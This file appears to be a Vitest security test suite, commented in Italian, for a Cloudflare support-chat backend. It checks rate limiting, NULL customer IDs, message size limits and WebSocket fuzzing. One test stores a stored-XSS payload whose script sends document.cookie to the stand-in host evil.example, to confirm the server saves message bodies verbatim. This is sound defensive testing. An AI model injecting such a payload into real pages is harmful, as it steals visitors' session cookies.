import { env } from 'cloudflare:test';
import { beforeEach, describe, expect, it } from 'vitest';
import { createId } from '../../../support/shared/ids';

beforeEach(async () => {
    const queries = JSON.parse(env.CHAT_CORE_MIGRATION_QUERIES) as string[];
    await env.CHAT_DB.batch(queries.map((query) => env.CHAT_DB.prepare(query)));
});

function createPayload(conversationId: string, visitorId: string, clientMessageId: string) {
    return {
        conversationId,
        visitorId,
        clientMessageId,
        body: 'First guest message',
        contactName: null,
        contactEmail: null,
        contactEmailLookupHash: null,
        contactVerifiedAt: null,
        pagePath: '/it/antivirus',
        productId: null,
        orderId: null,
        locale: 'it',
        countryCode: 'IT',
        createdAt: Date.now(),
    };
}

describe('sicurezza — rate limiting sui messaggi (DO)', () => {
    it('rifiuta il ventunesimo messaggio nello stesso minuto dallo stesso partecipante', async () => {
        const conversationId = createId('conversation');
        const visitorId = createId('visitor');
        const stub = env.CHAT_CONVERSATIONS.get(
            env.CHAT_CONVERSATIONS.idFromName(`conversation:${conversationId}`),
        );
        const createdAt = Date.now();
        await stub.fetch('https://internal/internal/conversations/create', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(createPayload(conversationId, visitorId, createId('message'))),
        });
        // Il primo messaggio (dentro createConversation) consuma gia' 1 slot su 20.
        const statuses: number[] = [];
        for (let i = 0; i < 25; i += 1) {
            const response = await stub.fetch('https://internal/internal/conversations/messages/send', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    conversationId,
                    visitorId,
                    clientMessageId: createId('message'),
                    body: `messaggio spam ${i}`,
                    createdAt: createdAt + i + 1,
                }),
            });
            statuses.push(response.status);
        }
        expect(statuses.filter((s) => s === 201)).toHaveLength(19);
        const rateLimited = statuses.filter((s) => s === 429);
        expect(rateLimited.length).toBeGreaterThan(0);
    });
});

describe('sicurezza — customer_id resta sempre NULL', () => {
    it('lo schema D1 rifiuta un INSERT con customer_id valorizzato', async () => {
        const conversationId = createId('conversation');
        await expect(env.CHAT_DB.prepare(`
            INSERT INTO chat_conversations (
                id, visitor_id, customer_id, status, last_seq, projection_version,
                visitor_unread_count, operator_unread_count, created_at, updated_at
            ) VALUES (?, ?, 'cust_should_not_be_allowed', 'OPEN', 0, 0, 0, 0, ?, ?)
        `).bind(conversationId, createId('visitor'), Date.now(), Date.now()).run())
            .rejects.toThrow();
    });

    it('la projection di una conversazione reale ha sempre customer_id NULL', async () => {
        const conversationId = createId('conversation');
        const visitorId = createId('visitor');
        const stub = env.CHAT_CONVERSATIONS.get(
            env.CHAT_CONVERSATIONS.idFromName(`conversation:${conversationId}`),
        );
        await stub.fetch('https://internal/internal/conversations/create', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(createPayload(conversationId, visitorId, createId('message'))),
        });
        await expect.poll(async () => env.CHAT_DB.prepare(
            'SELECT customer_id FROM chat_conversations WHERE id = ?',
        ).bind(conversationId).first<{ customer_id: string | null }>()).toMatchObject({
            customer_id: null,
        });
    });
});

describe('sicurezza — corpo del messaggio: nessuna interpretazione, solo storage opaco', () => {
    it('un payload con markup/script viene salvato carattere per carattere, non eseguito ne\' alterato', async () => {
        // La difesa reale contro lo stored XSS e' client-side (solo
        // `.textContent`, mai `.innerHTML`: vedi components/support-chat.js e
        // admin/support/support.js). Qui si verifica che il server non provi
        // a "sanitizzare" mutando silenziosamente il contenuto: se lo facesse
        // in modo incompleto darebbe un falso senso di sicurezza.
        const conversationId = createId('conversation');
        const visitorId = createId('visitor');
        const payload = '<script>fetch("https://evil.example/steal?c="+document.cookie)</script>'
            + '<img src=x onerror="alert(document.domain)">';
        const stub = env.CHAT_CONVERSATIONS.get(
            env.CHAT_CONVERSATIONS.idFromName(`conversation:${conversationId}`),
        );
        const response = await stub.fetch('https://internal/internal/conversations/create', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                ...createPayload(conversationId, visitorId, createId('message')),
                body: payload,
            }),
        });
        expect(response.status).toBe(201);
        const event = await response.json<{ payload: { body: string } }>();
        expect(event.payload.body).toBe(payload);

        const rows = await stub.fetch('https://internal/internal/conversations/messages', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ conversationId, visitorId, limit: 10 }),
        });
        const { messages } = await rows.json<{ messages: Array<{ body: string }> }>();
        expect(messages[0].body).toBe(payload);
    });

    it('rifiuta un payload oltre il limite di 4000 caratteri prima di persisterlo', async () => {
        const conversationId = createId('conversation');
        const visitorId = createId('visitor');
        const stub = env.CHAT_CONVERSATIONS.get(
            env.CHAT_CONVERSATIONS.idFromName(`conversation:${conversationId}`),
        );
        const response = await stub.fetch('https://internal/internal/conversations/create', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                ...createPayload(conversationId, visitorId, createId('message')),
                body: 'x'.repeat(4001),
            }),
        });
        expect(response.status).toBe(413);
        const rows = await env.CHAT_DB.prepare(
            'SELECT id FROM chat_conversations WHERE id = ?',
        ).bind(conversationId).first();
        expect(rows).toBeNull();
    });
});

function waitForMessage(ws: WebSocket, timeoutMs = 2000): Promise<Record<string, unknown>> {
    return new Promise((resolve, reject) => {
        const timer = setTimeout(() => reject(new Error('timeout waiting for websocket message')), timeoutMs);
        ws.addEventListener('message', (event: MessageEvent) => {
            clearTimeout(timer);
            resolve(JSON.parse(event.data as string));
        }, { once: true });
    });
}

describe('sicurezza — WebSocket: handshake malformato', () => {
    it('rifiuta un upgrade senza header Upgrade: websocket', async () => {
        const conversationId = createId('conversation');
        const visitorId = createId('visitor');
        const stub = env.CHAT_CONVERSATIONS.get(
            env.CHAT_CONVERSATIONS.idFromName(`conversation:${conversationId}`),
        );
        await stub.fetch('https://internal/internal/conversations/create', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(createPayload(conversationId, visitorId, createId('message'))),
        });
        // Nessun header Upgrade: una richiesta GET normale non deve poter
        // agganciare il canale realtime.
        const response = await stub.fetch(
            `https://internal/internal/conversations/ws?conversationId=${conversationId}`
                + `&visitorId=${visitorId}&lastKnownSeq=0`,
        );
        expect(response.status).toBe(426);
    });
});

describe('sicurezza — fuzzing dei payload sul WebSocket', () => {
    async function openSocket() {
        const conversationId = createId('conversation');
        const visitorId = createId('visitor');
        const stub = env.CHAT_CONVERSATIONS.get(
            env.CHAT_CONVERSATIONS.idFromName(`conversation:${conversationId}`),
        );
        await stub.fetch('https://internal/internal/conversations/create', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(createPayload(conversationId, visitorId, createId('message'))),
        });
        // lastKnownSeq=1: il primo messaggio (da createPayload) e' gia' noto,
        // quindi non c'e' catch-up da riprodurre. Resta comunque un evento di
        // bootstrap (conversation.updated) che il DO invia sempre appena
        // aperta la socket: va drenato qui, altrimenti i test lo scambiano
        // per la risposta al payload di fuzzing inviato dopo.
        const upgraded = await stub.fetch(
            `https://internal/internal/conversations/ws?conversationId=${conversationId}`
                + `&visitorId=${visitorId}&lastKnownSeq=1`,
            { headers: { Upgrade: 'websocket' } },
        );
        const ws = upgraded.webSocket as WebSocket;
        ws.accept();
        await waitForMessage(ws); // drena il bootstrap conversation.updated
        return { ws, conversationId, visitorId, stub };
    }

    it('un frame binario restituisce un errore invece di far cadere la connessione', async () => {
        const { ws } = await openSocket();
        ws.send(new Uint8Array([0x00, 0x01, 0x02, 0xff, 0xfe]).buffer);
        const error = await waitForMessage(ws);
        expect(error).toMatchObject({ type: 'error', error: { code: 'INVALID_PAYLOAD' } });
        expect(ws.readyState).toBe(WebSocket.OPEN);
        ws.close(1000, 'test complete');
    });

    it('testo non-JSON restituisce un errore invece di far cadere la connessione', async () => {
        const { ws } = await openSocket();
        ws.send('questo non e\' json {{{');
        const error = await waitForMessage(ws);
        expect(error).toMatchObject({ type: 'error', error: { code: 'INVALID_PAYLOAD' } });
        expect(ws.readyState).toBe(WebSocket.OPEN);
        ws.close(1000, 'test complete');
    });

    it('un comando JSON valido ma di tipo sconosciuto viene rifiutato senza effetti collaterali', async () => {
        const { ws, conversationId } = await openSocket();
        ws.send(JSON.stringify({
            v: 1,
            type: 'admin.deleteEverything',
            requestId: createId('request'),
            conversationId,
            payload: { anything: 'goes here' },
        }));
        const error = await waitForMessage(ws);
        expect(error).toMatchObject({ type: 'error', error: { code: 'INVALID_PAYLOAD' } });
        ws.close(1000, 'test complete');
        // Nessun effetto collaterale: la conversazione non ha guadagnato
        // messaggi ne' cambiato stato per via del comando sconosciuto.
        const detail = await env.CHAT_DB.prepare(
            'SELECT last_seq, status FROM chat_conversations WHERE id = ?',
        ).bind(conversationId).first<{ last_seq: number; status: string }>();
        expect(detail).toMatchObject({ last_seq: 1, status: 'OPEN' });
    });

    it('un conversationId nel comando diverso da quello della connessione viene rifiutato', async () => {
        const { ws } = await openSocket();
        const otherConversationId = createId('conversation');
        ws.send(JSON.stringify({
            v: 1,
            type: 'message.send',
            requestId: createId('request'),
            conversationId: otherConversationId,
            payload: { clientMessageId: createId('message'), body: 'cross-conversation attempt' },
        }));
        const error = await waitForMessage(ws);
        expect(error).toMatchObject({ type: 'error', error: { code: 'NOT_FOUND' } });
        ws.close(1000, 'test complete');
    });
});
